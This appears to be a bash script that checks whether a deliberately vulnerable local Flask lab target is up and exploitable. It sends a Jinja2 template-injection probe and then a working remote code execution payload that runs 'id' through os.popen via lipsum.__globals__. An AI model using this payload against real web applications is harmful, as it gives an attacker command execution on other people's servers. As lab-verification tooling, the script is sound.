#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/deploy-common.sh"

TARGET="Flask SSTI"
URL="http://localhost:8000"

log_info "Verifying $TARGET at $URL..."

# Step 1: SSTI detection (7*7 should equal 49)
BODY=$(curl -s --connect-timeout 5 --max-time 10 "${URL}/?name=%7B%7B7*7%7D%7D" 2>/dev/null)

if echo "$BODY" | grep -q "49"; then
    log_success "$TARGET SSTI detection confirmed (7*7=49)"
else
    log_error "$TARGET SSTI detection failed — target not reachable or not vulnerable"
    exit 1
fi

# Step 2: RCE payload (os.popen)
BODY2=$(curl -s --connect-timeout 5 --max-time 10 \
  "${URL}/?name=%7B%7Blipsum.__globals__%5B%22os%22%5D.popen(%22id%22).read()%7D%7D" 2>/dev/null)

if echo "$BODY2" | grep -q "uid="; then
    log_success "$TARGET RCE confirmed"
    echo "  Response: $(echo "$BODY2" | grep -o 'uid=[^<]*' | head -1)"
    exit 0
else
    log_warn "$TARGET SSTI present but RCE payload failed"
    exit 1
fi
